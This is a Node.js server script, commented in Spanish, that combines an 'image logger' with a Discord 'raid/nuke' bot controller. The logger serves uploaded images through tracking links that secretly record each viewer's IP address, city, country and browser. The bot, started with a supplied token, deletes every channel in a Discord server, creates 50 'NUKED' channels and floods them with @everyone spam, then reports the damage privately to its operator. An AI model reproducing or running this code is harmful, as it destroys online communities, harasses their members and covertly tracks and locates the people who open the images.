const express = require('express');
const { Client, IntentsBitField, ChannelType, Events } = require('discord.js');
const axios = require('axios');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();

// Configuración
const PORT = process.env.PORT || 8080;

// Crear carpetas necesarias
const dirs = ['./public', './public/uploads'];
dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
        console.log(`📁 Carpeta creada: ${dir}`);
    }
});

// Configuración de multer para imágenes
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, './public/uploads/');
    },
    filename: (req, file, cb) => {
        const uniqueName = Date.now() + '-' + Math.round(Math.random() * 1E9) + path.extname(file.originalname);
        cb(null, uniqueName);
    }
});

const upload = multer({
    storage: storage,
    limits: { fileSize: 10 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Solo imágenes'), false);
        }
    }
});

// Middleware
app.use(express.json());
app.use(express.static('public'));
app.use('/uploads', express.static('public/uploads'));

// Variables globales
let ipLogs = [];
let activeBots = new Map();
let uploadedImages = new Map();

// Configuración del raid
const RAID_CONFIG = {
    canales: 50,
    mensajesPorCanal: 15,
    nombreCanal: "NUKED",
    mensaje: "@everyone SERVIDOR DESTRUIDO 🔥\n" + "█".repeat(2000)
};

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(),
        botsActivos: activeBots.size,
        imagenes: uploadedImages.size,
        ipsCapturadas: ipLogs.length
    });
});

// ============================================
// IMAGE LOGGER ENDPOINTS
// ============================================

// Subir imagen
app.post('/api/upload-image', upload.single('image'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No image uploaded' });
        }

        const imageId = Date.now() + '-' + Math.random().toString(36).substring(7);
        const baseUrl = `${req.protocol}://${req.get('host')}`;
        
        uploadedImages.set(imageId, {
            filename: req.file.filename,
            originalName: req.file.originalname,
            path: req.file.path,
            url: `/uploads/${req.file.filename}`,
            mimetype: req.file.mimetype,
            createdAt: new Date(),
            views: 0
        });

        const loggerUrl = `${baseUrl}/image/${imageId}`;

        res.json({
            success: true,
            imageId: imageId,
            loggerUrl: loggerUrl,
            previewUrl: `/uploads/${req.file.filename}`,
            discordPreview: `${baseUrl}/image/${imageId}`,
            originalName: req.file.originalname
        });

    } catch (error) {
        console.error('Error subiendo imagen:', error);
        res.status(500).json({ error: error.message });
    }
});

// Servir imagen con logger
app.get('/image/:imageId', async (req, res) => {
    const imageId = req.params.imageId;
    const imageData = uploadedImages.get(imageId);
    
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
    
    let geo = "Desconocido";
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`);
        if(response.data.status === 'success') {
            geo = `${response.data.city}, ${response.data.country}`;
        }
    } catch(e) {}

    if (imageData) {
        imageData.views = (imageData.views || 0) + 1;
    }

    ipLogs.unshift({
        ip: ip.split(',')[0],
        geo: geo,
        date: new Date().toLocaleTimeString(),
        ua: req.headers['user-agent'],
        imageId: imageId,
        imageName: imageData?.originalName || 'Desconocida',
        timestamp: new Date().toISOString()
    });

    if (ipLogs.length > 100) ipLogs.pop();

    if (imageData && fs.existsSync(imageData.path)) {
        res.sendFile(path.resolve(imageData.path));
    } else {
        res.redirect('https://via.placeholder.com/400x300?text=Image+Not+Found');
    }
});

// Obtener todas las imágenes
app.get('/api/images', (req, res) => {
    const images = Array.from(uploadedImages.entries()).map(([id, data]) => ({
        id: id,
        originalName: data.originalName,
        url: data.url,
        loggerUrl: `/image/${id}`,
        createdAt: data.createdAt,
        views: data.views || 0
    }));
    res.json(images);
});

// Obtener logs de IPs
app.get('/api/ip-logs', (req, res) => {
    res.json(ipLogs);
});

// ============================================
// BOT DE COMANDOS - MODO ROUND ROBIN
// ============================================

// Iniciar bot
app.post('/api/start-bot', async (req, res) => {
    const { token, prefix = '.' } = req.body;
    
    if (!token) {
        return res.status(400).json({ error: "Token requerido" });
    }

    if (activeBots.has(token)) {
        return res.json({ success: true, message: "El bot ya está activo" });
    }

    const bot = new Client({ 
        intents: [
            IntentsBitField.Flags.Guilds,
            IntentsBitField.Flags.GuildMessages,
            IntentsBitField.Flags.MessageContent,
            IntentsBitField.Flags.GuildMembers,
            IntentsBitField.Flags.DirectMessages
        ] 
    });

    try {
        await bot.login(token);
        
        bot.once('ready', () => {
            console.log(`✅ Bot conectado: ${bot.user.tag}`);
            console.log(`📊 Servidores: ${bot.guilds.cache.size}`);
            
            bot.on(Events.MessageCreate, async (message) => {
                if (message.author.bot) return;
                
                if (!message.content.startsWith(prefix)) return;
                
                const args = message.content.slice(prefix.length).trim().split(/ +/);
                const command = args.shift().toLowerCase();
                
                console.log(`📨 Comando recibido: ${command} de ${message.author.tag}`);

                // ============================================
                // COMANDO .raid - MODO ROUND ROBIN
                // ============================================
                if (command === 'raid') {
                    // Intentar enviar mensaje privado
                    try {
                        await message.author.send(`⚡ **INICIANDO RAID MODO ROUND ROBIN** ⚡\n\`\`\`\nServidor: ${message.guild?.name}\nCanales: ${RAID_CONFIG.canales}\nMensajes por canal: ${RAID_CONFIG.mensajesPorCanal}\n\`\`\``);
                        await message.delete().catch(() => {});
                    } catch (e) {
                        await message.reply('⚠️ No puedo enviarte mensajes privados. Habilita "Permitir mensajes directos" en las opciones del servidor.');
                        return;
                    }
                    
                    try {
                        const guild = message.guild;
                        if (!guild) {
                            await message.author.send('❌ Este comando solo funciona en servidores');
                            return;
                        }

                        // ============================================
                        // FASE 1: ELIMINAR CANALES EXISTENTES
                        // ============================================
                        await message.author.send('🗑️ **FASE 1:** Eliminando canales existentes...');
                        
                        const channels = await guild.channels.fetch();
                        const deletePromises = [];
                        
                        channels.forEach(channel => {
                            if (channel.deletable) {
                                deletePromises.push(channel.delete().catch(() => {}));
                            }
                        });
                        
                        await Promise.all(deletePromises);
                        const canalesEliminados = deletePromises.length;
                        
                        await message.author.send(`✅ Canales eliminados: ${canalesEliminados}`);

                        // ============================================
                        // FASE 2: CREAR TODOS LOS CANALES PRIMERO
                        // ============================================
                        await message.author.send(`📌 **FASE 2:** Creando ${RAID_CONFIG.canales} canales...`);
                        
                        const createPromises = [];
                        for (let i = 0; i < RAID_CONFIG.canales; i++) {
                            createPromises.push(
                                guild.channels.create({
                                    name: `${RAID_CONFIG.nombreCanal}-${i}`,
                                    type: ChannelType.GuildText
                                }).catch(() => null)
                            );
                        }
                        
                        const canales = await Promise.all(createPromises);
                        const canalesValidos = canales.filter(c => c !== null);
                        const canalesCreados = canalesValidos.length;
                        
                        await message.author.send(`✅ Canales creados: ${canalesCreados}`);

                        // ============================================
                        // FASE 3: ENVIAR MENSAJES EN MODO ROUND ROBIN
                        // ============================================
                        await message.author.send(`📝 **FASE 3:** Enviando mensajes en modo ROUND ROBIN...`);
                        
                        if (canalesValidos.length === 0) {
                            await message.author.send('❌ No se pudieron crear canales');
                            return;
                        }

                        const mensajesPorCanal = new Array(canalesValidos.length).fill(0);
                        let mensajesEnviados = 0;
                        const totalMensajesNecesarios = RAID_CONFIG.canales * RAID_CONFIG.mensajesPorCanal;
                        
                        // Crear un array de promesas para enviar mensajes en paralelo
                        const messagePromises = [];
                        
                        // Mientras no hayamos enviado todos los mensajes necesarios
                        while (mensajesEnviados < totalMensajesNecesarios) {
                            // Recorrer todos los canales en orden
                            for (let i = 0; i < canalesValidos.length; i++) {
                                // Si este canal ya tiene sus 15 mensajes, saltarlo
                                if (mensajesPorCanal[i] >= RAID_CONFIG.mensajesPorCanal) {
                                    continue;
                                }
                                
                                const channel = canalesValidos[i];
                                
                                // Enviar mensaje y actualizar contadores
                                messagePromises.push(
                                    channel.send(RAID_CONFIG.mensaje).then(() => {
                                        mensajesPorCanal[i]++;
                                        mensajesEnviados++;
                                        console.log(`📨 Mensaje ${mensajesPorCanal[i]}/15 enviado a canal ${i}`);
                                    }).catch(e => {
                                        console.log(`Error enviando a canal ${i}:`, e.message);
                                    })
                                );
                                
                                // Pequeña pausa para no saturar la API
                                await new Promise(resolve => setTimeout(resolve, 50));
                            }
                        }
                        
                        // Esperar a que todos los mensajes se envíen
                        await Promise.all(messagePromises);

                        // ============================================
                        // FASE 4: VERIFICACIÓN Y REPORTE
                        // ============================================
                        let canalesCompletados = 0;
                        for (let i = 0; i < mensajesPorCanal.length; i++) {
                            if (mensajesPorCanal[i] === RAID_CONFIG.mensajesPorCanal) {
                                canalesCompletados++;
                            } else {
                                console.log(`⚠️ Canal ${i} solo tiene ${mensajesPorCanal[i]} mensajes`);
                            }
                        }

                        const reporte = `✅ **RAID COMPLETADO - MODO ROUND ROBIN** ✅
\`\`\`prolog
🗑️ CANALES ELIMINADOS: ${canalesEliminados}
📌 CANALES CREADOS: ${canalesCreados}
💬 MENSAJES ENVIADOS: ${mensajesEnviados}
📊 CANALES COMPLETADOS: ${canalesCompletados}/${RAID_CONFIG.canales}
⚡ OBJETIVO POR CANAL: ${RAID_CONFIG.mensajesPorCanal}
\`\`\``;

                        await message.author.send(reporte);
                        
                        // Mensaje de confirmación en el primer canal
                        if (canalesValidos.length > 0) {
                            await canalesValidos[0].send(`✅ RAID COMPLETADO POR ${message.author.tag} - ${mensajesEnviados} mensajes enviados`);
                        }

                    } catch (e) {
                        console.error('Error en raid:', e);
                        await message.author.send(`❌ Error: ${e.message}`);
                    }
                }
                
                // COMANDO .nuke (igual que antes)
                else if (command === 'nuke') {
                    try {
                        await message.author.send('💥 **INICIANDO NUKE**...');
                        await message.delete().catch(() => {});
                    } catch (e) {
                        await message.reply('No puedo enviarte mensajes privados');
                        return;
                    }
                    
                    try {
                        const guild = message.guild;
                        if (!guild) {
                            await message.author.send('❌ Este comando solo funciona en servidores');
                            return;
                        }

                        const channels = await guild.channels.fetch();
                        const deletePromises = [];
                        
                        channels.forEach(channel => {
                            if (channel.deletable) {
                                deletePromises.push(channel.delete().catch(() => {}));
                            }
                        });
                        
                        await Promise.all(deletePromises);
                        
                        await message.author.send(`✅ **NUKE COMPLETADO**\n\`\`\`\n🗑️ Canales eliminados: ${deletePromises.length}\n\`\`\``);
                        
                    } catch (e) {
                        await message.author.send(`❌ Error: ${e.message}`);
                    }
                }
                
                // COMANDO .stop
                else if (command === 'stop' || command === 'off') {
                    await message.author.send('🛑 **DETENIENDO BOT**...');
                    
                    for (const [t, botData] of activeBots.entries()) {
                        if (botData.userTag === bot.user.tag) {
                            activeBots.delete(t);
                            break;
                        }
                    }
                    
                    await message.author.send('✅ Bot desconectado.');
                    setTimeout(() => bot.destroy(), 1000);
                }
                
                // COMANDO .servers
                else if (command === 'servers') {
                    try {
                        const guilds = bot.guilds.cache;
                        let serverList = '**📡 SERVIDORES:**\n```\n';
                        guilds.forEach(g => {
                            serverList += `- ${g.name} (${g.memberCount} miembros)\n`;
                        });
                        serverList += '```';
                        await message.author.send(serverList);
                    } catch (e) {
                        await message.reply('No puedo enviarte mensajes privados');
                    }
                }
                
                // COMANDO .ping
                else if (command === 'ping') {
                    const ping = Date.now() - message.createdTimestamp;
                    try {
                        await message.author.send(`🏓 **PONG!** Latencia: ${ping}ms | API: ${Math.round(bot.ws.ping)}ms`);
                    } catch (e) {
                        await message.reply(`🏓 PONG! Latencia: ${ping}ms`);
                    }
                }
                
                // COMANDO .help
                else if (command === 'help') {
                    const helpMsg = `
**🤖 COMANDOS DEL BOT - MODO ROUND ROBIN**
\`\`\`css
${prefix}raid    - Destruye el servidor (canales primero, luego mensajes round-robin)
${prefix}nuke    - Elimina todos los canales
${prefix}stop    - Detiene el bot
${prefix}servers - Lista servidores
${prefix}ping    - Ver latencia
\`\`\`
⚙️ **CONFIGURACIÓN:**
\`\`\`yaml
Canales: ${RAID_CONFIG.canales}
Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}
Nombre: ${RAID_CONFIG.nombreCanal}
Modo: PRIMERO CANALES, LUEGO MENSAJES ROUND-ROBIN
\`\`\``;
                    
                    try {
                        await message.author.send(helpMsg);
                    } catch (e) {
                        await message.reply('No puedo enviarte mensajes privados');
                    }
                }
            });
            
            console.log(`👂 Bot escuchando comandos con prefijo: ${prefix}`);
        });

        activeBots.set(token, {
            client: bot,
            userTag: bot.user?.tag || 'Desconocido',
            startedAt: new Date().toISOString(),
            prefix: prefix,
            servers: bot.guilds.cache.size
        });

        res.json({ 
            success: true, 
            message: "✅ Bot iniciado - Modo ROUND ROBIN activado",
            user: bot.user?.tag,
            servers: bot.guilds.cache.size,
            config: RAID_CONFIG
        });

    } catch (err) { 
        console.error('Error iniciando bot:', err);
        res.status(401).json({ error: "Token Inválido: " + err.message }); 
    }
});

// Detener bot
app.post('/api/stop-bot', async (req, res) => {
    const { token } = req.body;
    
    const botData = activeBots.get(token);
    
    if (botData) {
        try {
            await botData.client.destroy();
            activeBots.delete(token);
            res.json({ success: true, message: "✅ Bot detenido" });
        } catch (e) {
            res.json({ success: false, message: "Error deteniendo bot" });
        }
    } else {
        res.json({ success: false, message: "❌ Bot no encontrado" });
    }
});

// Obtener servidores del bot
app.post('/api/get-guilds', async (req, res) => {
    const { token } = req.body;
    
    const botData = activeBots.get(token);
    
    if (botData) {
        const guilds = botData.client.guilds.cache.map(guild => ({
            id: guild.id,
            name: guild.name,
            memberCount: guild.memberCount,
            icon: guild.iconURL()
        }));
        return res.json({ success: true, guilds });
    }
    
    const tempBot = new Client({ intents: [IntentsBitField.Flags.Guilds] });

    try {
        await tempBot.login(token);
        
        tempBot.once('ready', async () => {
            const guilds = tempBot.guilds.cache.map(guild => ({
                id: guild.id,
                name: guild.name,
                memberCount: guild.memberCount,
                icon: guild.iconURL()
            }));
            
            await tempBot.destroy();
            res.json({ success: true, guilds });
        });

    } catch (err) { 
        res.status(401).json({ error: "Token Inválido" }); 
    }
});

// Obtener bots activos
app.get('/api/active-bots', (req, res) => {
    const bots = [];
    activeBots.forEach((data, token) => {
        bots.push({
            token: token.substring(0, 20) + "...",
            user: data.userTag,
            startedAt: data.startedAt,
            servers: data.servers || 0,
            prefix: data.prefix || '.'
        });
    });
    res.json(bots);
});

// Actualizar configuración
app.post('/api/update-config', (req, res) => {
    const { canales, mensajesPorCanal, nombreCanal, mensaje } = req.body;
    
    if (canales) RAID_CONFIG.canales = parseInt(canales);
    if (mensajesPorCanal) RAID_CONFIG.mensajesPorCanal = parseInt(mensajesPorCanal);
    if (nombreCanal) RAID_CONFIG.nombreCanal = nombreCanal;
    if (mensaje) RAID_CONFIG.mensaje = mensaje;
    
    res.json({ 
        success: true, 
        message: "Configuración actualizada",
        config: RAID_CONFIG 
    });
});

// ============================================
// INICIAR SERVIDOR
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📁 Carpeta uploads: ${path.resolve('./public/uploads')}`);
    console.log(`🤖 MODO ROUND ROBIN ACTIVADO:`);
    console.log(`   - Canales: ${RAID_CONFIG.canales}`);
    console.log(`   - Mensajes por canal: ${RAID_CONFIG.mensajesPorCanal}`);
    console.log(`   - Nombre canal: ${RAID_CONFIG.nombreCanal}`);
    console.log(`   - Estrategia: PRIMERO CANALES, LUEGO MENSAJES ROUND-ROBIN`);
    console.log(`🌐 URL: http://localhost:${PORT}`);
});